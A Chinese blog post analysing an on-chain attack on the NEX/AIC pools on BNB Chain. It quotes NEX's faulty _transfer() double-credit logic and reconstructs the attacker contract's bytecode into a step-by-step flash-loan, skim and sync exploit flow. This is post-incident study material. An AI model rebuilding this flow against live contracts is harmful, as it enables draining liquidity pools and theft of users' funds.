---
layout: single
title: AIC–NEX Attack Analysis
date: 2026-10-07 21:02:00 +0800
permalink: /posts/aic-nex-attack-analysis/
tags: [Blockchain, Audit, Bytecode Analysis]
description: "结合 NEX 转账逻辑审计与攻击合约字节码逆向，分析漏洞根因和完整调用流程，并附资金流与储备变化的 HTML 报告。"
source_folder: Blockchain/AIC-NEX
lang: zh-CN
excerpt: "结合 NEX 转账逻辑审计与攻击合约字节码逆向，分析漏洞根因和完整调用流程，并附资金流与储备变化的 HTML 报告。"
---
{% raw %}
本文结合 NEX 转账逻辑审计与攻击合约字节码逆向，整理 AIC / NEX 事件的漏洞根因和完整调用流程。

**[查看 HTML 分析报告：资金流、储备变化与逐步推导](/reports/aic-nex-attack.html)**

## 基本信息

- **链**：BNB Chain
    
- **交易哈希**：`0x905cc861bcc525d3a8e699583943831b97500bbac11c92dc20ed6edbddd69f87`
    
- **区块高度**：`113782392`
    
- **编译器**：Solc `0.8.21`


|                                     | 地址                                           |
| ----------------------------------- | -------------------------------------------- |
| 攻击者 EOA                             | `0xC3cB0872C42BFA5EB3B0258D7EEA2cCaF6a49475` |
| Factory（交易 CREATE）                  | `0xf0F74b90aFB29903C80ED7531B50764C49089E25` |
| Child（Factory constructor 内 CREATE） | `0x29977d9b8a888b17bffa2958b003956a5e8be69a` |
| AIC（Fee-on-Transfer Token）          | `0xc0DC449De632586A00409873521AFC251aC5cE74` |
| NEX                                 | `0xaE04AE29bdB7aB7Eb249d3aFa7Bc3D37564e8Cf9` |
| USDC                                | `0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d` |
| WBNB                                | `0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c` |
| PancakeSwap V2 Router               | `0x10ED43C718714eb63d5aA57B78B54704E256024E` |
| USDC/AIC Pair（闪贷源）                  | `0xe89636FB73D04Db51e5Fbd0Ce1379fb8d2b96415` |
| NEX/AIC Pair（`skim` 受害池）            | `0x974C0078740480aE830D379fDB8d5f441C9dDC75` |

攻击者最终净收益约 **32.36 BNB**。

整次攻击全部发生在**一笔合约创建交易**中。交易首先部署 Factory，Factory constructor 再部署 Child 并立即调用攻击入口。


```text
EOA
 │
 │ CREATE
 ▼
Factory constructor
 │
 ├── CREATE Child
 │
 └── CALL Child.attack()
          │
          └── 完成完整攻击流程
```


---

---

## NEX 转账逻辑审计

nex 是一个 erc20 代币，产生问题的根本原因在于其对 erc20 的`_transfer()`函数的重写：

```solidity
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        bool isSell = automatedMarketMakerPairs[to];
        bool isRouter = (from == uniswapV2Router || to == uniswapV2Router);

        if (isRouter){
            super._transfer(from, to, amount);
        } else if (isSell){
            uint256 daoTokens = amount.mul(daoFee).div(100);
            uint256 nodeTokens = amount.mul(nodeFee).div(100);
            
            amount = amount.sub(daoTokens).sub(nodeTokens);

            // to dao
            if (daoTokens > 0){
                super._transfer(from, daoAddress, daoTokens);
            }

            // to node
            if (nodeTokens > 0){
                super._transfer(from, nodeAddress, nodeTokens);
            }
            
        }
        super._transfer(from, to, amount);
    }
```

注意`bool isRouter = (from == uniswapV2Router || to == uniswapV2Router);`判断，`from`或者`to`为 router 都会被判断为`true`而进行一次转账：

```solidity
		if (isRouter){
            super._transfer(from, to, amount);
        }
```

而常规转账的调用，在重写函数的最后又被调用了一次:

```solidity
            // to node
            if (nodeTokens > 0){
                super._transfer(from, nodeAddress, nodeTokens);
            }
            
        }
        super._transfer(from, to, amount);
    }
```

因此只要转账的`from`或者`to`为 router，就能直接双花转两份 token。

因此整体利用逻辑就是：找高资产目标，尝试调用`_transfer(router,amount of pair/2)`。
对应的，找到`skim(router)`，为了提取尽量多的 nex，通过闪电贷，swap 走 pair 中小于一半的 nex。再全部转给 pair。调用`skim()`，连同`skim()`与 nex 逻辑问题产生的额外利益一起转给 router，完成攻击。

最后，归还闪电贷借的 aic，将所有收益换为 bnb。

---

## 字节码整体结构


```text
[ Factory creation code ][ Child creation code ]
        221 B                    5082 B
        0xdd                     0x13da
```

Child creation code 被直接附加在 Factory creation code 后方。

Factory constructor 通过 `CODECOPY` 将后半段 Child initcode 拷入内存，然后执行 `CREATE`。

---

### Factory constructor

Factory constructor 的核心逻辑：

```text
PUSH2 0x13da
PUSH2 0x00dd
CODECOPY

PUSH0
CREATE
```

即：

```text
memory[...] = code[0xdd : 0xdd + 0x13da]

child = CREATE(
    value = 0,
    offset = memory_offset,
    size = 0x13da
)
```


- `0x00dd`：Child creation code 在整笔交易字节码中的起始偏移；
    
- `0x13da`：Child creation code 长度；
    
- `CREATE`：部署真正执行攻击逻辑的 Child。
    

Child 创建完成后，Factory 立即构造 selector：

```text
PUSH4 0x28022411
PUSH1 0xe0
SHL
```

得到 calldata：

```text
0x28022411
```

随后直接：

```text
CALL child
```

即调用：

```solidity
child.attack();
```

最后 Factory 拷贝并返回自身 runtime：

```text
PUSH1 0x39
PUSH2 0x00a4
PUSH0
CODECOPY

PUSH1 0x39
PUSH0
RETURN
```

但 Factory 最终部署出来的 runtime 主体只有：

```text
PUSH0
DUP1
REVERT
```

即：

```text
0x5f80fd
```

除 metadata 外没有有效业务逻辑。

factory 逻辑如下：

```text
部署 Child
    ↓
立即触发攻击
    ↓
constructor 结束
    ↓
留下一个不可用的死合约
```

---

### Child constructor

Child constructor 的主要作用是：

1. 初始化关键地址；
    
2. 保存攻击收益接收地址；
    
3. 返回真正的攻击 runtime。
    

constructor 连续写入 8 个 storage slot：

```text
slot 0 = 0x10ED43C718714eb63d5aA57B78B54704E256024E
slot 1 = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d
slot 2 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
slot 3 = 0xc0DC449De632586A00409873521AFC251aC5cE74
slot 4 = 0xaE04AE29bdB7aB7Eb249d3aFa7Bc3D37564e8Cf9
slot 5 = 0x974C0078740480aE830D379fDB8d5f441C9dDC75
slot 6 = 0xe89636FB73D04Db51e5Fbd0Ce1379fb8d2b96415
slot 7 = ORIGIN
```

对应关系为：

```solidity
slot0 = PANCAKE_ROUTER;
slot1 = USDC;
slot2 = WBNB;
slot3 = AIC;
slot4 = NEX;
slot5 = NEX_AIC_PAIR;
slot6 = USDC_AIC_PAIR;
slot7 = tx.origin;
```

其中值得注意的是：

```text
opcode 0x32 = ORIGIN
```

因此 `slot7` 保存的是：

```solidity
tx.origin
```

而不是：

```solidity
msg.sender
```

这是必要的，因为当前调用链是：

```text
EOA
 ↓
Factory constructor
 ↓
CREATE Child
```

在 Child constructor 中：

```text
msg.sender = Factory
tx.origin  = 攻击者 EOA
```

如果保存 `CALLER`，最终记录的将是 Factory 地址。

使用 `ORIGIN` 后，Child 能直接保存最初发起交易的攻击者 EOA，并在攻击结束后将利润转回该地址。

constructor 最后执行：

```text
CODECOPY
RETURN
```

返回长度：

```text
0x12e0 bytes
```

作为 Child 的最终 runtime bytecode。

---

## Child runtime 调度器

Child runtime 开头是标准 selector dispatcher。

首先检查 calldata 长度：

```text
calldatasize < 4
    → STOP
```

随后读取前 4 字节 selector：

```text
msg.sig = calldata[0:4]
```

并进行分发：

```text
0x28022411
    → attack()

0x84800812
    → pancakeCall(...)

0xe7ff9f4a
    → recover(token)

其他 selector
    → STOP
```


---


## Child 调用逻辑

Child runtime 中出现的主要外部 ABI selector 如下：

| Selector     | ABI                                                          |
| ------------ | ------------------------------------------------------------ |
| `0x70a08231` | `balanceOf(address)`                                         |
| `0xa9059cbb` | `transfer(address,uint256)`                                  |
| `0x095ea7b3` | `approve(address,uint256)`                                   |
| `0x5c11d795` | `swapExactTokensForTokensSupportingFeeOnTransferTokens(...)` |
| `0x791ac947` | `swapExactTokensForETHSupportingFeeOnTransferTokens(...)`    |
| `0x022c0d9f` | `swap(uint256,uint256,address,bytes)`                        |
| `0xbc25cf77` | `skim(address)`                                              |
| `0xfff6cae9` | `sync()`                                                     |

调用流程如下：

```text
Child.attack()                          // selector 0x28022411，恢复名
│
├─ dispatcher 0x0021 命中后进入 0x0bfc
│
├─ 没有 ABI 参数
│    0x0c22 SLT(calldatasize - 4, 0)
│    0x0c26 为真 → revert 0x01d2
│    dispatcher 已经要求 calldatasize >= 4，这条只是编译器的下限检查
│    calldata 比 4 字节长不会在这里被拒绝
│
├─ require(tx.origin == slot7)
│    slot7 是 constructor 写入的 ORIGIN
│    0x0c3c SLOAD slot7
│    0x0c40 ORIGIN
│    0x0c41 SUB
│    0x0c45 差值非 0 → revert 0x01d2
│
│  ── 读两个池的 AIC 余额 ──────────────────────────
│
├─ aicOnUsdc = AIC.balanceOf(USDC_AIC)          // 0x0ca8
│    selector 0x70a08231
│    AIC = slot3，USDC_AIC = slot6
│
├─ aicOnNex = AIC.balanceOf(NEX_AIC)            // 0x0d20
│    selector 0x70a08231
│    NEX_AIC = slot5
│
│  ── 门槛 ─────────────────────────────────────────
│
├─ aicOnNex * 10665 溢出
│    0x0d30 PUSH2 0x29a9
│    0x0d44 → Panic(0x11) @ 0x10a0
│
├─ threshold = aicOnNex * 10665 / 10000
│    0x0d45 PUSH2 0x2710
│    整除，不四舍五入
│
│    10665/10000 = 1.0665
│    1/(0.94*0.9975) ≈ 1.066496，取整后落到这个分数
│    0.94 和 0.9975 不是字节码里的常数
│
├─ require(aicOnUsdc >= threshold)
│    0x0d4f aicOnUsdc < threshold → revert 0x01d2
│
│  ── 从 USDC/AIC 借出 AIC ─────────────────────────
│
├─ 0x0d6a EXTCODESIZE(USDC_AIC) == 0 → revert 0x01d2
│
├─ USDC_AIC.sync()                              // 0x0da0
│    selector 0xfff6cae9
│    reserve 先写成当前余额
│    Pair.swap 要求 amountOut < reserve
│    这样后面的余额减 1 才能过
│
├─ amount1Out = aicOnUsdc + (2^256 - 1)
│    即 aicOnUsdc - 1
│    0x0def 结果 > aicOnUsdc → Panic(0x11) @ 0x095f
│
│    这个池 token0 是 USDC，token1 是 AIC
│    借出的是 amount1，amount0 是 0
│
└─ USDC_AIC.swap(                              // 0x0e9d
       amount0Out = 0,
       amount1Out = aicOnUsdc - 1,
       to         = address(this),
       data       = abi.encode(aicOnUsdc)      // 32 字节
   )
     selector 0x022c0d9f
     data 里是减 1 之前的余额，不是 amount1Out
     │
     └─ Pair 回调
          pancakeCall(sender, 0, aicOnUsdc - 1, data)


Child.pancakeCall(address,uint256,uint256,bytes)   // selector 0x84800812
│
├─ 0x01f5 msg.value != 0 → revert 0x01ec
│
├─ 0x021f (calldatasize - 4) < 0x80 → revert 0x01ec
│
├─ sender  = calldata[0x04]              // 0x1154，高 96 位非 0 → revert 0x01d2
├─ amount0 = calldata[0x24]              // 本笔是 0，还款不用它
├─ amount1 = calldata[0x44]              // 本笔是 aicOnUsdc - 1，还款也不用它
├─ data    = bytes 的第一个字
│    attack() 把 offset 写成 0x80、长度写成 32
│    所以这个字在 calldata[0xa4]，值是 aicOnUsdc
│    0x08f6 CALLDATALOAD
│
│  ── 用借到的 AIC 买 NEX ──────────────────────────
│
├─ path = [AIC, NEX]                     // length = 2，slot3、slot4
│
├─ AIC.approve(router, type(uint256).max)        // 0x033c
│    selector 0x095ea7b3
│
├─ aicBal = AIC.balanceOf(address(this))         // 0x03b1
│
├─ router.swapExactTokensForTokensSupportingFeeOnTransferTokens(  // 0x040d
│      aicBal, 0, path, address(this), block.timestamp
│  )
│    selector 0x5c11d795
│
│  ── 买到的 NEX 要够再灌一份 ──────────────────────
│
├─ childNex = NEX.balanceOf(address(this))       // 0x0468
│
├─ childNex * 94
│    0x0478 PUSH1 94
│    0x048a → Panic(0x11) @ 0x0b29
│
├─ pairNex = NEX.balanceOf(NEX_AIC)              // 0x04f4
│
├─ pairNex - 1 下溢 → Panic(0x11) @ 0x0abd
│    加的是 2^256 - 1
│
├─ require(childNex * 94 / 100 >= pairNex - 1)
│    0x0536 不满足 → revert 0x09a5
│    6% 税后大约实收 94/100，这里要求持仓盖得住下一笔
│
│  ── 灌 NEX，skim 给 router，再 sync ─────────────
│
├─ pairNex2 = NEX.balanceOf(NEX_AIC)             // 0x059f，重新读
│
├─ donate = (pairNex2 - 1) * 100 / 94
│    0x05d9 PUSH1 100
│    0x0630 PUSH1 94
│    减 1 下溢，或 *100 溢出 → Panic(0x11) @ 0x0a53
│    整除。税后进池的数量约等于 pairNex2 - 1
│
├─ NEX.transfer(NEX_AIC, donate)                 // 0x064a
│    selector 0xa9059cbb
│
├─ NEX_AIC.skim(router)                          // 0x06c6
│    selector 0xbc25cf77
│    to 是 constructor 存下的 router，不是 address(this)
│    抽出的是 NEX 盈余（balance - reserve），不是 AIC
│    NEX._transfer 在 to == router 时先 super._transfer 一次
│    那个分支不 return，函数末尾再 super._transfer 一次
│    所以同一笔 skim 会给 router 记两笔等额 NEX
│
├─ NEX_AIC.sync()                                // 0x0727
│    selector 0xfff6cae9
│    把 reserve 写成 skim 之后的余额
│    本笔 skim 后池里的 NEX 大约剩 1 wei
│    不做这次 sync，后面卖 NEX 用的仍是买完时的旧 reserve
│
│  ── 卖掉剩下的 NEX ───────────────────────────────
│
├─ path = [NEX, AIC]                     // length = 2
│
├─ NEX.approve(router, type(uint256).max)        // 0x07f1
│
├─ nexLeft = NEX.balanceOf(address(this))        // 0x0866
│
├─ router.swapExactTokensForTokensSupportingFeeOnTransferTokens(  // 0x08c0
│      nexLeft, 0, path, address(this), block.timestamp
│  )
│    selector 0x5c11d795
│
│  ── 还款乘的是 data，不是 amount0 / amount1 ────
│
├─ data * 10026 溢出
│    0x08f7 PUSH2 0x272a
│    0x090b → Panic(0x11) @ 0x095f
│
├─ repay = data * 10026 / 10000
│    0x0938 PUSH2 0x2710
│    向 0 截断的整除，没有 ADD 1
│    本笔 data = 42982239623681550888856013
│    repay    = 43093993446703122921167038
│    若改乘 data - 1，结果少 1 wei
│
└─ AIC.transfer(msg.sender, repay)               // 0x0951
     selector 0xa9059cbb
     0x0932 CALLER
     回调里 msg.sender 是 USDC/AIC Pair

0x016e RETURN，回到 attack()


Child.attack() 续
│
├─ aicLeft = AIC.balanceOf(address(this))        // 0x0f88
│    还款之后留在 Child 上的 AIC
│    来自把捐赠后剩下的 NEX 卖进刚被 sync 的池子
│    不是 skim 抽出来的 AIC
│
└─ router.swapExactTokensForETHSupportingFeeOnTransferTokens(  // 0x0fe2
       aicLeft,
       0,
       [AIC, USDC, WBNB],                        // slot3、slot1、slot2，length = 3
       tx.origin,                                // ORIGIN，不是 msg.sender
       block.timestamp
   )
     selector 0x791ac947
     Router 把路径末端的 WBNB withdraw 成 BNB，转给 tx.origin

0x0fff RETURN
```

{% endraw %}
